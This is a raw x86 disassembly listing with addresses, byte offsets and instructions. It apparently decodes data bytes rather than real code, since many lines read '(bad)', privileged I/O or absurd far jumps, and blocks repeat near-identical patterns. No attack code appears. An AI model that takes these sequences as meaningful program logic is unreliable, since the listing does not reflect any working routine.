  408fa3:	call   edi
  408fa5:	mov    ds:0x8ccfff58,al
  408faa:	inc    eax
  408fab:	inc    esi
  408fad:	js     0x408fd8
  408faf:	inc    edx
  408fb1:	jb     0x408fda
  408fb3:	(bad)  
  408fb4:	mov    edi,0xbeff266d
  408fb9:	ins    BYTE PTR es:[edi],dx
  408fba:	sub    bh,bh
  408fbc:	rcr    BYTE PTR [edx+0x7eadff69],cl
  408fc2:	sub    bh,bh
  408fc4:	sbb    dl,BYTE PTR [ebx]
  408fc6:	push   es
  408fc7:	cmp    eax,DWORD PTR [eax]
  408fc9:	add    BYTE PTR [eax],al
  408fcb:	sbb    BYTE PTR [eax],al
  408fcd:	add    BYTE PTR [eax],al
  408fcf:	add    al,0x0
	...
  409015:	add    BYTE PTR [eax],al
  409017:	add    BYTE PTR [eax-0x51e6ad6e],bh
  40901d:	mov    DWORD PTR [ecx+0x41],eax
  409020:	lods   al,BYTE PTR ds:[esi]
  409021:	xor    DWORD PTR [ecx],0x3382ad62
  409027:	jnp    0x408fd3
  409029:	jnp    0x409050
  40902b:	clc    
  40902c:	les    ebp,FWORD PTR [eax-0x7e4e0094]
  409032:	sub    eax,0x2885b3ff
  409037:	(bad)  
  409038:	mov    esp,0xc3ff2d8b
  40903d:	xchg   edi,eax
  40903e:	xor    eax,0x3fa0caff
  409043:	jmp    edx
  409045:	retf   
  409046:	xchg   ebx,eax
  409047:	push   edi
  409049:	icebp  
  40904a:	in     eax,0xff
  40904c:	stc    
  40904d:	repz out 0xff,eax
  409050:	hlt    
  409051:	jmp    0xff6b:0xb9dfffd4
  409058:	xlat   BYTE PTR ds:[ebx]
  409059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40905a:	inc    ecx
  40905b:	call   esp
  40905d:	call   0xff33:0x91d1ff3b
  409064:	int    0x88
  409066:	cs dec ebx
  409069:	jg     0x409094
  40906b:	inc    esi
  40906d:	ja     0x409096
  40906f:	inc    esp
  409071:	jno    0x409099
  409073:	inc    ecx
  409075:	outs   dx,BYTE PTR ds:[esi]
  409076:	and    eax,0x256abeff
  40907b:	dec    ebp
  40907d:	mov    ds,WORD PTR [eax-0x1]
  409080:	mov    edx,0x64ff468f
  409085:	dec    eax
  409086:	push   ss
  409087:	data16 add BYTE PTR [eax],al
  40908a:	add    BYTE PTR [esi],bl
  40908c:	add    BYTE PTR [eax],al
  40908e:	add    BYTE PTR [edi],al
	...
  4090d8:	mov    ebp,0xb1125a9a
  4090dd:	mov    eax,DWORD PTR [eax+0x31]
  4090e0:	scas   al,BYTE PTR es:[edi]
  4090e1:	xor    DWORD PTR [ebx+ecx*2],0xffffffaf
  4090e5:	test   BYTE PTR [ebx],dh
  4090e7:	pop    edi
  4090e8:	test   eax,0xc9da267b
  4090ed:	stos   DWORD PTR es:[edi],eax
  4090ee:	jno    0x4090ef
  4090f0:	mov    ch,0x88
  4090f2:	aaa    
  4090f3:	push   DWORD PTR [ebp-0x4500da7e]
  4090f9:	mov    BYTE PTR [ecx],ch
  4090fb:	inc    eax
  4090fd:	(bad)  
  4090fe:	sub    al,0xff
  409100:	(bad)  
  409101:	cdq    
  409102:	xor    edi,edi
  409104:	int    0xa0
  409106:	cmp    eax,0x64b8dbff
  40910b:	push   esp
  40910d:	call   0xf43b90e3
  409112:	out    0xff,eax
  409114:	stc    
  409115:	repnz out 0xff,al
  409118:	jmp    0x42a5:0xd8ff9ad0
  40911f:	call   ebx
  409121:	cwde   
  409122:	ss dec edi
  409125:	mov    ?,WORD PTR [ecx]
  409127:	dec    esp
  409129:	sub    BYTE PTR [ebx],0xff
  40912c:	leave  
  40912d:	jnp    0x409156
  40912f:	inc    edi
  409131:	je     0x409158
  409133:	inc    ebx
  409135:	jno    0x40915c
  409137:	(bad)  
  409138:	mov    edi,0xc9ff256d
  40913d:	test   BYTE PTR [edx-0x1],cl
  409140:	(bad)  
  409141:	lahf   
  409142:	popa   
  409143:	inc    DWORD PTR [ebx+0x901d5f]
  409149:	add    BYTE PTR [eax],al
  40914b:	and    eax,0xa000000
	...
  409198:	ret    0x65a3
  40919b:	movzx  edx,WORD PTR [eax-0x744ad5b8]
  4091a2:	aas    
  4091a3:	inc    ebx
  4091a4:	mov    ch,0x8b
  4091a6:	cmp    eax,0x2a7eab55
  4091ab:	mov    ecx,0xff6da9c8
  4091b0:	mov    esp,0xb5ff4b95
  4091b5:	sub    DWORD PTR [eax],0xffffffff
  4091b8:	mov    edx,0xc0ff2784
  4091bd:	mov    esp,DWORD PTR [edi]
  4091bf:	inc    ebp
  4091c1:	xchg   ebx,eax
  4091c2:	sub    al,0xff
  4091c4:	retf   
  4091c5:	call   0xff3a:0xa2d0ff33
  4091cc:	xlat   BYTE PTR ds:[ebx]
  4091cd:	scas   al,BYTE PTR es:[edi]
  4091ce:	dec    ecx
  4091cf:	(bad)  
  4091d0:	out    dx,al
  4091d1:	fldcw  WORD PTR [ebp-0x170b0501]
  4091d7:	(bad)  
  4091d8:	cli    
  4091d9:	repz out 0xff,eax
  4091dc:	repnz loop 0x4091a1
  4091df:	(bad)  
  4091e0:	fsubr  QWORD PTR [ebp-0x672c00ac]
  4091e6:	ss dec edi
  4091e9:	mov    DWORD PTR [esi],ebp
  4091eb:	dec    esp
  4091ed:	and    DWORD PTR [edi],0x2579c9ff
  4091f3:	inc    ebp
  4091f5:	jae    0x40921c
  4091f7:	inc    edx
  4091f9:	jo     0x409221
  4091fb:	inc    esi
  4091fd:	jl     0x40923b
  4091ff:	dec    edi
  409201:	test   al,0x70
  409203:	call   DWORD PTR [esi+0xbb216d]
  409209:	add    BYTE PTR [eax],al
  40920b:	sub    eax,DWORD PTR [eax]
  40920d:	add    BYTE PTR [eax],al
  40920f:	push   cs
	...
  409238:	dec    eax
  409239:	popf   
  40923a:	ror    BYTE PTR [esp+edi*1],0x89
  40923e:	stos   DWORD PTR es:[edi],eax
  40923f:	push   ds
  409240:	cmp    bh,BYTE PTR [esi-0x62]
  409243:	push   eax
  409244:	cmp    eax,0x42b9a685
  409249:	mov    ebp,DWORD PTR [ebx-0x5776bd27]
  40924f:	inc    DWORD PTR [edx-0x79]
  409252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409253:	inc    DWORD PTR [eax-0x7d]
  409256:	mov    ds:0x977c3eff,eax
  40925b:	inc    DWORD PTR [edi+0x76]
  40925e:	xchg   edi,edi
  409260:	push   ebp
  409261:	je     0x4092db
  409263:	jmp    DWORD PTR [edx+0x74]
  409266:	outs   dx,BYTE PTR ds:[esi]
  409267:	inc    DWORD PTR [esi-0x410eb187]
  40926d:	cdq    
  40926e:	push   esp
  40926f:	inc    esi
  409271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409272:	fs (bad) 
  409274:	mov    esi,0xc0ff3a92
  409279:	xchg   ebx,eax
  40927a:	ss inc ecx
  40927d:	xchg   ecx,eax
  40927e:	xor    bh,bh
  409280:	lds    edx,FWORD PTR [eax-0x6b3600d6]
  409286:	sub    edi,edi
  409288:	int    0x9a
  40928a:	xor    bh,bh
  40928c:	shl    BYTE PTR [ebx-0x532700c7],cl
  409292:	inc    ecx
  409293:	jmp    esi
  409295:	enter  0xff83,0xf9
  409299:	out    dx,eax
  40929a:	fdivp  st(7),st
  40929c:	cli    
  40929d:	repz out 0xff,eax
  4092a0:	stc    
  4092a1:	out    dx,eax
  4092a2:	fdivp  st(7),st
  4092a4:	loop   0x409261
  4092a6:	outs   dx,DWORD PTR ds:[esi]
  4092a7:	call   ebx
  4092a9:	xchg   ebp,eax
  4092aa:	xor    edi,edi
  4092ac:	iret   
  4092ad:	mov    DWORD PTR [ebx],ebp
  4092af:	dec    ebx
  4092b1:	jg     0x4092d9
  4092b3:	inc    edi
  4092b5:	jns    0x4092dc
  4092b7:	inc    esp
  4092b9:	jne    0x4092e1
  4092bb:	inc    esp
  4092bd:	jns    0x4092f0
  4092bf:	call   esp
  4092c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092c2:	jo     0x4092c3
  4092c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c5:	jbe    0x4092eb
  4092c7:	in     al,0x0
  4092c9:	add    BYTE PTR [eax],al
  4092cb:	xor    BYTE PTR [eax],al
  4092cd:	add    BYTE PTR [eax],al
  4092cf:	adc    eax,DWORD PTR [eax]
  4092d1:	add    BYTE PTR [eax],al
  4092d3:	add    al,BYTE PTR [eax]
	...
  4092ed:	add    BYTE PTR [eax],al
  4092ef:	add    BYTE PTR [edi-0x66],al
  4092f2:	mov    ebp,0xbb99480a
  4092f7:	sub    cl,BYTE PTR [eax-0x64]
  4092fa:	mov    edi,0xb28e3a9e
  4092ff:	call   FWORD PTR [eax-0x63]
  409302:	mov    eax,0xc7ac5eff
  409307:	push   DWORD PTR [edi-0x3a]
  40930a:	(bad)  
  40930c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40930d:	in     al,dx
  40930e:	hlt    
  40930f:	jmp    FWORD PTR [edx-0x6c00020a]
  409315:	jmp    0x409311
  409317:	jmp    DWORD PTR [edx-0x2f]
  40931a:	lock inc DWORD PTR [ebx-0x43]
  40931e:	loopne 0x40931f
  409320:	ds mov dl,0xcf
  409323:	dec    DWORD PTR [ebx-0x57]
  409326:	mov    edx,0x909766ff
  40932b:	push   DWORD PTR [edx-0x2e00c87a]
  409331:	mov    ch,0x7a
  409333:	inc    ebp
  409335:	fwait
  409336:	dec    eax
  409337:	inc    edi
  409339:	sahf   
  40933a:	inc    esi
  40933b:	dec    edx
  40933d:	popf   
  40933e:	inc    esi
  40933f:	dec    esp
  409341:	mov    eax,ds:0xa0cfff47
  409346:	inc    eax
  409347:	dec    edi
  409349:	mov    al,ds:0xa5d4ff3c
  40934e:	cmp    edi,edi
  409350:	(bad)  
  409351:	test   eax,0xb3ddff40
  409356:	dec    ecx
  409357:	jmp    ebp
  409359:	(bad)  
  40935a:	jns    0x40935b
  40935c:	cli    
  40935d:	hlt    
  40935e:	call   0xe7338e62
  409363:	(bad)  
  409364:	stc    
  409365:	out    dx,eax
  409366:	(bad)  
  409368:	(bad)  
  409369:	call   0xff2b:0x8cd1ff36
  409370:	into   
  409371:	test   BYTE PTR [edi],ah
  409373:	dec    ecx
  409375:	jle    0x40939c
  409377:	inc    edi
  409379:	jp     0x4093a0
  40937b:	inc    esi
  40937d:	jns    0x4093a9
  40937f:	call   ebp
  409381:	lahf   
  409382:	push   0x2c80afff
  409387:	jmp    FWORD PTR [eax]
  409389:	sbb    eax,0x4009
  40938e:	add    BYTE PTR [ecx],bl
  409390:	add    BYTE PTR [eax],al
  409392:	add    BYTE PTR [eax+eax*1],al
	...
  4093ad:	add    BYTE PTR [eax],al
  4093af:	add    BYTE PTR [edx-0x65],al
  4093b2:	ror    BYTE PTR [ecx+0x3b],0x9e
  4093b6:	(bad)  
  4093b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093ba:	int    0xff
  4093bc:	inc    esi
  4093bd:	mov    cl,0xd8
  4093bf:	call   DWORD PTR [esi-0x3a]
  4093c2:	call   0xf51c08c6
  4093c7:	call   DWORD PTR [edi+eiz*8-0xf55000b]
  4093ce:	idiv   edi
  4093d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093d1:	out    dx,eax
  4093d2:	clc    
  4093d3:	dec    DWORD PTR [esi+0x5ffff5e5]
  4093d9:	int    0xed
  4093db:	inc    DWORD PTR [ecx-0x46]
  4093de:	(bad)  
  4093e0:	cmp    esi,DWORD PTR [eax-0x55bf0031]
  4093e6:	ret    
  4093e7:	inc    DWORD PTR [edx-0x5b]
  4093ea:	mov    edx,0x327ea1ff
  4093ef:	call   esi
  4093f1:	mov    ebp,0xa6caff8b
  4093f6:	pop    edx
  4093f7:	dec    esp
  4093f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093fa:	push   edx
  4093fb:	dec    ebp
  4093fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093fe:	push   edx
  4093ff:	call   ecx
  409401:	test   eax,0xacd4ff53
  409406:	push   edi
  409407:	(bad)  
  409408:	fdiv   DWORD PTR [eax-0x482300a3]
  40940e:	fs jmp eax
  409411:	mov    esi,0xc3e4ff6d
  409416:	jp     0x409417
  409418:	clc    
  409419:	lock (bad) 
  40941c:	sti    
  40941d:	hlt    
  40941e:	jmp    0xe9359022
  409423:	(bad)  
  409424:	in     al,dx
  409425:	iret   
  409426:	xchg   esi,eax
  409427:	call   edi
  409429:	pushf  
  40942a:	xor    eax,0x2b91d3ff
  40942f:	call   ecx
  409431:	mov    DWORD PTR [esi],esp
  409433:	dec    esp
  409435:	test   BYTE PTR [esi],ah
  409437:	dec    ebx
  409439:	jg     0x409461
  40943b:	dec    eax
  40943d:	jnp    0x409466
  40943f:	call   edx
  409441:	cwde   
  409442:	pop    eax
  409443:	(bad)  
  409444:	mov    ebp,0x6bff4a93
  409449:	dec    esi
  40944a:	pop    ss
  40944b:	ins    DWORD PTR es:[edi],dx
  40944c:	add    BYTE PTR [eax],al
  40944e:	add    BYTE PTR [edi],bl
  409450:	add    BYTE PTR [eax],al
  409452:	add    BYTE PTR [eax],cl
	...
  409470:	xor    ebx,DWORD PTR [edi-0x55e84634]
  409476:	loope  0x409477
  409478:	and    bh,BYTE PTR [esi-0x39bb000b]
  40947e:	icebp  
  40947f:	call   FWORD PTR [ebp-0x31]
  409482:	lock push DWORD PTR [ecx+ebx*8-0xe]
  409487:	call   DWORD PTR [edi+eiz*8-0xf55000b]
  40948e:	idiv   edi
  409490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409491:	out    dx,al
  409492:	idiv   edi
  409494:	mov    fs,ebp
  409496:	cmc    
  409497:	jmp    DWORD PTR [eax-0x34]
  40949a:	jmp    0x40949b
  40949c:	dec    ecx
  40949d:	mov    ebx,0xb147ffdb
  4094a2:	retf   0x4eff
  4094a5:	lods   al,BYTE PTR ds:[esi]
  4094a6:	mov    esp,0xada85cff
  4094ab:	call   DWORD PTR [esi-0x2700b77a]
  4094b1:	mov    esp,0xb5d5ff88
  4094b6:	outs   dx,BYTE PTR ds:[esi]
  4094b7:	call   esp
  4094b9:	scas   al,BYTE PTR es:[edi]
  4094ba:	pop    edi
  4094bb:	call   esp
  4094bd:	mov    al,0x60
  4094bf:	call   esi
  4094c1:	mov    dl,0x63
  4094c3:	(bad)  
  4094c4:	fnstenv [esi-0x45230098]
  4094ca:	jo     0x4094cb
  4094cc:	ffreep st(2)
  4094ce:	jns    0x4094cf
  4094d0:	in     eax,0xc9
  4094d2:	mov    edi,edi
  4094d4:	clc    
  4094d5:	out    dx,eax
  4094d6:	(bad)  
  4094d8:	sti    
  4094d9:	imul   esi
  4094db:	(bad)  
  4094dc:	sti    
  4094dd:	imul   esi
  4094df:	push   esp
  4094e1:	in     eax,0xbf
  4094e3:	jmp    ebx
  4094e5:	mov    ebp,0xb3e2ff6b
  4094ea:	pop    ebx
  4094eb:	(bad)  
  4094ec:	fld    TBYTE PTR [eax-0x5f2500b4]
  4094f2:	inc    esp
  4094f3:	call   esi
  4094f5:	cwde   
  4094f6:	notrack call ecx
  4094f9:	nop
  4094fa:	xor    eax,0x328cceff
  4094ff:	call   ecx
  409501:	xchg   esi,eax
  409502:	dec    esp
  409503:	dec    ebx
  409505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409506:	inc    DWORD PTR [bx+0x1d62]
  40950b:	xchg   edi,eax
  40950c:	add    BYTE PTR [eax],al
  40950e:	add    BYTE PTR [esi],ah
  409510:	add    BYTE PTR [eax],al
  409512:	add    BYTE PTR [ebx],cl
	...
  409530:	xor    ebx,DWORD PTR [edi-0x4ef00035]
  409536:	lock jmp DWORD PTR [esp+edi*4]
  40953a:	repnz inc DWORD PTR [ebp+eax*8-0x10]
  40953f:	call   FWORD PTR [ebp-0x31]
  409542:	lock push DWORD PTR [ecx+ebx*8-0xe]
  409547:	call   DWORD PTR [edi+eiz*8-0xf55000b]
  40954e:	idiv   edi
  409550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409551:	in     eax,dx
  409552:	idiv   bh
  409554:	(bad)  
  409555:	in     al,0xf4
  409557:	jmp    DWORD PTR [eax-0x33]
  40955a:	in     al,dx
  40955b:	call   DWORD PTR [eax-0x44]
  40955e:	fcos   
  409560:	push   ebp
  409561:	mov    bl,0xc5
  409563:	call   FWORD PTR [ebp-0x52]
  409566:	mov    dh,0xff
  409568:	outs   dx,BYTE PTR ds:[esi]
  409569:	lods   al,BYTE PTR ds:[esi]
  40956a:	test   eax,0x619192ff
  40956f:	dec    esi
  409571:	mov    al,0x77
  409573:	(bad)  
  409574:	ffree  st(1)
  409576:	xchg   bh,bh
  409578:	fdiv   DWORD PTR [edi-0x46260092]
  40957e:	jno    0x40957f
  409580:	fstp   TBYTE PTR [ebx-0x4021008b]
  409586:	jp     0x409587
  409588:	ffreep st(3)
  40958a:	test   edi,edi
  40958c:	in     eax,0xcc
  40958e:	mov    ?,edi
  409590:	clc    
  409591:	out    dx,al
  409592:	fdiv   st(7),st
  409594:	cld    
  409595:	clc    
  409596:	lock (bad) 
  409598:	cld    
  409599:	clc    
  40959a:	out    dx,eax
  40959b:	push   esi
  40959d:	in     al,dx
  40959e:	iret   
  40959f:	(bad)  
  4095a0:	call   0xe640176e
  4095a5:	ret    
  4095a6:	js     0x4095a7
  4095a8:	in     eax,0xc0
  4095aa:	jae    0x4095ab
  4095ac:	in     al,0xbd
  4095ae:	outs   dx,DWORD PTR ds:[esi]
  4095af:	jmp    ebx
  4095b1:	mov    edx,0xb8e2ff6e
  4095b6:	ins    DWORD PTR es:[edi],dx
  4095b7:	jmp    ecx
  4095b9:	mov    ch,0x6e
  4095bb:	(bad)  
  4095bc:	fidiv  WORD PTR [ebx-0x461f0092]
  4095c2:	jge    0x4095c3
  4095c4:	fidivr DWORD PTR [ebx+ecx*4+0x216f9aff]
  4095cb:	ret    
  4095cc:	add    eax,0x2d0304
  4095d1:	add    BYTE PTR [eax],al
  4095d3:	sldt   WORD PTR [eax]
  4095d6:	add    BYTE PTR [ecx],al
	...
  4095f0:	xor    esp,DWORD PTR [ecx-0x4ef10035]
  4095f6:	out    dx,eax
  4095f7:	jmp    DWORD PTR [esp+edi*4]
  4095fa:	repnz inc DWORD PTR [ebp-0x3b]
  4095fe:	out    dx,al
  4095ff:	call   FWORD PTR [ebp-0x31]
  409602:	lock push DWORD PTR [ebp-0x28]
  409606:	bnd call DWORD PTR [ebp-0x55000a1a]
  40960d:	out    dx,eax
  40960e:	idiv   edi
  409610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409611:	in     eax,dx
  409612:	idiv   bh
  409614:	(bad)  
  409615:	in     al,0xf4
  409617:	call   FWORD PTR [edi-0x33]
  40961a:	in     eax,dx
  40961b:	dec    DWORD PTR [edi-0x43]
  40961e:	(bad)  
  409620:	pop    eax
  409621:	mov    dh,0xc8
  409623:	jmp    DWORD PTR [ecx-0x50]
  409626:	mov    edx,0xaeaf71ff
  40962b:	dec    DWORD PTR [edi+ebx*4-0x633f0082]
  409632:	pop    eax
  409633:	jmp    ebx
  409635:	retf   
  409636:	call   0xdeff:0x7dbfddff
  40963d:	rol    DWORD PTR [ecx-0x773c2001],0xff
  409644:	loop   0x40960d
  409646:	mov    ?,edi
  409648:	in     eax,0xcd
  40964a:	cwde   
  40964b:	push   esi
  40964d:	in     al,dx
  40964e:	(bad)  
  40964f:	(bad)  
  409650:	cld    
  409651:	clc    
  409652:	icebp  
  409653:	(bad)  
  409654:	cld    
  409655:	clc    
  409656:	lock (bad) 
  409658:	clc    
  409659:	out    dx,al
  40965a:	fcos   
  40965c:	jmp    0x85cb:0xe9ff90cf
  409663:	jmp    edi
  409665:	enter  0xff80,0xe7
  409669:	les    edi,FWORD PTR [ebp-0x1]
  40966c:	out    0xc4,eax
  40966e:	jl     0x40966f
  409670:	out    0xc2,eax
  409672:	jl     0x409673
  409674:	in     eax,0xc0
  409676:	jl     0x409677
  409678:	in     al,0xbe
  40967a:	jge    0x40967b
  40967c:	jecxz  0x40963b
  40967e:	jnp    0x40967f
  409680:	jecxz  0x40963d
  409682:	cmp    bh,0xe5
  409685:	int3   
  409686:	mov    eax,ds:0x2479a8ff
  40968b:	jmp    0x364ca7a5
  409690:	add    BYTE PTR [eax],al
  409692:	add    BYTE PTR [ebx],dl
  409694:	add    BYTE PTR [eax],al
  409696:	add    BYTE PTR [edx],al
	...
  4096b0:	xor    ah,BYTE PTR [ecx-0x4df20034]
  4096b6:	out    dx,eax
  4096b7:	jmp    DWORD PTR [ebx]
  4096b9:	mov    ebx,0xc445fff1
  4096be:	out    dx,al
  4096bf:	call   FWORD PTR [esi-0x31]
  4096c2:	lock push DWORD PTR [ebp-0x27]
  4096c6:	bnd call DWORD PTR [edi+eiz*8-0xf55000b]
  4096ce:	idiv   edi
  4096d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096d1:	in     eax,dx
  4096d2:	idiv   bh
  4096d4:	mov    esp,fs
  4096d6:	hlt    
  4096d7:	call   FWORD PTR [ebp-0x33]
  4096da:	out    dx,al
  4096db:	dec    DWORD PTR [ebx-0x42]
  4096de:	loopne 0x4096df
  4096e0:	dec    edi
  4096e1:	mov    bh,0xd1
  4096e3:	call   DWORD PTR [ebp-0x4f]
  4096e6:	(bad)  
  4096e9:	mov    al,0xbc
  4096eb:	push   DWORD PTR [ebp-0x55]
  4096ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096ef:	push   DWORD PTR [ecx-0x1600c97b]
  4096f5:	aam    0xad
  4096f7:	jmp    ecx
  4096f9:	(bad)  
  4096fa:	mov    ?,edi
  4096fc:	jecxz  0x4096c5
  4096fe:	xchg   edx,eax
  4096ff:	jmp    esp
  409701:	retf   0xff97
  409704:	out    0xcf,al
  409706:	popf   
  409707:	push   ebp
  409709:	in     al,dx
  40970a:	aad    0xff
  40970c:	cld    
  40970d:	stc    
  40970e:	repz (bad) 
  409710:	cld    
  409711:	stc    
  409712:	repz (bad) 
  409714:	clc    
  409715:	repz loop 0x409717
  409718:	in     eax,dx
  409719:	aad    0x9f
  40971b:	(bad)  
  40971c:	jmp    0x8dcd:0xeaff93cf
  409723:	(bad)  
  409724:	jmp    0xea4023f4
  409729:	retf   
  40972a:	mov    edi,edi
  40972c:	jmp    0xea4020fb
  409731:	retf   0xff89
  409734:	jmp    0xe9402101
  409739:	(bad)  
  40973a:	mov    bh,bh
  40973c:	out    0xc5,eax
  40973e:	mov    edi,edi
  409740:	in     eax,0xc4
  409742:	mov    edi,edi
  409744:	in     al,dx
  409745:	aam    0xac
  409747:	push   DWORD PTR [ebp+0x4aff3689]
  40974d:	aaa    
  40974e:	pop    ss
  40974f:	dec    edi
  409750:	add    BYTE PTR [eax],al
  409752:	add    BYTE PTR [edx],bl
  409754:	add    BYTE PTR [eax],al
  409756:	add    BYTE PTR ds:0x0,al
	...
  409770:	xor    al,0xa1
  409772:	int    0xff
  409774:	push   cs
  409775:	mov    cl,0xee
  409777:	jmp    DWORD PTR [ebx]
  409779:	mov    ebx,0xc545fff1
  40977e:	out    dx,al
  40977f:	call   FWORD PTR [esi-0x31]
  409782:	lock push DWORD PTR [ebp-0x27]
  409786:	bnd call DWORD PTR [edi+eiz*8-0xf55000b]
  40978e:	idiv   edi
  409790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409791:	in     eax,dx
  409792:	idiv   bh
  409794:	mov    esp,fs
  409796:	hlt    
  409797:	call   FWORD PTR [esi+ecx*8-0x11]
  40979b:	inc    DWORD PTR [ebx-0x42]
  40979e:	in     eax,0xff
  4097a0:	inc    edx
  4097a1:	mov    bh,0xda
  4097a3:	inc    DWORD PTR [ebx-0x4f]
  4097a6:	sar    bh,1
  4097a8:	dec    ebp
  4097a9:	mov    al,0xc9
  4097ab:	call   FWORD PTR [edx-0x51]
  4097ae:	ret    0xa1ff
  4097b1:	xor    BYTE PTR [esi],0xff
  4097b4:	out    0xd4,eax
  4097b6:	scas   eax,DWORD PTR es:[edi]
  4097b7:	jmp    edi
  4097b9:	rcr    BYTE PTR [edi-0x62301901],1
  4097bf:	jmp    edi
  4097c1:	shl    DWORD PTR [eax-0x49231101],1
  4097c7:	(bad)  
  4097c8:	std    
  4097c9:	stc    
  4097ca:	repz (bad) 
  4097cc:	std    
  4097cd:	stc    
  4097ce:	repz (bad) 
  4097d0:	cli    
  4097d1:	cmc    
  4097d2:	jmp    0xac1b86d6
  4097d7:	(bad)  
  4097d8:	in     al,dx
  4097d9:	aad    0x9f
  4097db:	(bad)  
  4097dc:	in     eax,dx
  4097dd:	rcr    DWORD PTR [edx-0x682d1301],cl
  4097e3:	(bad)  
  4097e4:	in     al,dx
  4097e5:	rcl    BYTE PTR [edi-0x682f1301],1
  4097eb:	(bad)  
  4097ec:	in     al,dx
  4097ed:	rcl    BYTE PTR [edi-0x69301301],1
  4097f3:	(bad)  
  4097f4:	jmp    0x4097c5
  4097f6:	xchg   esi,eax
  4097f7:	(bad)  
  4097f8:	jmp    0x96cc:0xeaff96ce
  4097ff:	(bad)  
  409800:	jmp    0xee402cd0
  409805:	(bad)  
  409806:	lods   eax,DWORD PTR ds:[esi]
  409807:	inc    ebp
  409809:	mov    al,ds:0x597bff5b
  40980e:	pop    ds
  40980f:	jp     0x409811
  409811:	add    BYTE PTR [eax],al
  409813:	and    BYTE PTR [eax],al
  409815:	add    BYTE PTR [eax],al
  409817:	or     BYTE PTR [eax],al
	...
  40982d:	add    BYTE PTR [eax],al
  40982f:	add    BYTE PTR [edx+eiz*4],dh
  409832:	int    0xff
  409834:	or     eax,0x24ffeeb0
  409839:	mov    ebx,0xc545fff1
  40983e:	out    dx,eax
  40983f:	call   FWORD PTR [ebp-0x30]
  409842:	icebp  
  409843:	push   DWORD PTR [ecx+ebx*8-0xd]
  409847:	call   DWORD PTR [edi+eiz*8-0xf55000b]
  40984e:	idiv   edi
  409850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409851:	in     eax,dx
  409852:	idiv   bh
  409854:	mov    esp,fs
  409856:	hlt    
  409857:	call   FWORD PTR [ebp-0x32]
  40985a:	out    dx,eax
  40985b:	inc    DWORD PTR [edi-0x42]
  40985e:	in     al,0xff
  409860:	dec    eax
  409861:	mov    ecx,0xb54effd9
  409866:	iret   
  409867:	call   FWORD PTR [ebp-0x4c]
  40986a:	(bad)  
  40986b:	jmp    FWORD PTR [esi-0x4b]
  40986e:	mov    edi,0x528c9bff
  409873:	(bad)  
  409874:	faddp  st(7),st
  409876:	popf   
  409877:	(bad)  
  409878:	in     al,dx
  409879:	fsubr  DWORD PTR [ebp-0x5a2b1501]
  40987f:	(bad)  
  409880:	jmp    0x409858
  409882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409883:	(bad)  
  409884:	in     al,dx
  409885:	fsubr  DWORD PTR [ebx-0x28130901]
  40988b:	(bad)  
  40988c:	clc    
  40988d:	icebp  
  40988e:	loopne 0x40988f
  409890:	out    dx,eax
  409891:	fidiv  WORD PTR [ebp-0x56261101]
  409897:	(bad)  
  409898:	out    dx,al
  409899:	xlat   BYTE PTR ds:[ebx]
  40989a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40989b:	(bad)  
  40989c:	out    dx,al
  40989d:	(bad)  
  40989e:	mov    ds:0xa3d6eeff,eax
  4098a3:	(bad)  
  4098a4:	out    dx,al
  4098a5:	(bad)  
  4098a6:	mov    ds:0xa3d5eeff,eax
  4098ab:	(bad)  
  4098ac:	out    dx,al
  4098ad:	aad    0xa3
  4098af:	(bad)  
  4098b0:	out    dx,al
  4098b1:	aad    0xa3
  4098b3:	(bad)  
  4098b4:	out    dx,al
  4098b5:	aad    0xa3
  4098b7:	(bad)  
  4098b8:	out    dx,al
  4098b9:	aad    0xa2
  4098bb:	(bad)  
  4098bc:	out    dx,al
  4098bd:	aam    0xa1
  4098bf:	(bad)  
  4098c0:	in     eax,dx
  4098c1:	shl    BYTE PTR [ecx-0x4f281001],cl
  4098c7:	call   esp
  4098c9:	mov    ecx,0x6b95ff84
  4098ce:	and    ah,BYTE PTR [ebx+0x23000000]
  4098d4:	add    BYTE PTR [eax],al
  4098d6:	add    BYTE PTR [ecx],cl
	...
  4098f0:	xor    al,0xa2
  4098f2:	int    0xff
  4098f4:	or     eax,0x24ffeeb0
  4098f9:	mov    ebx,0xc546fff1
  4098fe:	out    dx,al
  4098ff:	call   FWORD PTR [esi-0x31]
  409902:	lock push DWORD PTR [ebp-0x27]
  409906:	bnd call DWORD PTR [edi+eiz*8-0xf55000b]
  40990e:	idiv   edi
  409910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409911:	in     eax,dx
  409912:	idiv   bh
  409914:	mov    esp,fs
  409916:	hlt    
  409917:	call   FWORD PTR [ebx-0x32]
  40991a:	lock inc DWORD PTR [ecx-0x42]
  40991e:	out    0xff,al
  409920:	inc    edi
  409921:	mov    ebx,0xb64effdc
  409926:	sar    edi,1
  409928:	pop    ebp
  409929:	mov    dh,0xc9
  40992b:	jmp    FWORD PTR [ebp-0x49]
  40992e:	ret    0x91ff
  409931:	popf   
  409932:	ja     0x409933
  409934:	int    0xb0
  409936:	jns    0x409937
  409938:	lock loopne 0x4098fb
  40993b:	(bad)  
  40993c:	in     eax,dx
  40993d:	fidiv  DWORD PTR [eax-0x4f251101]
  409943:	(bad)  
  409944:	out    dx,al
  409945:	fisubr DWORD PTR [edi-0x4f241001]
  40994b:	(bad)  
  40994c:	out    dx,eax
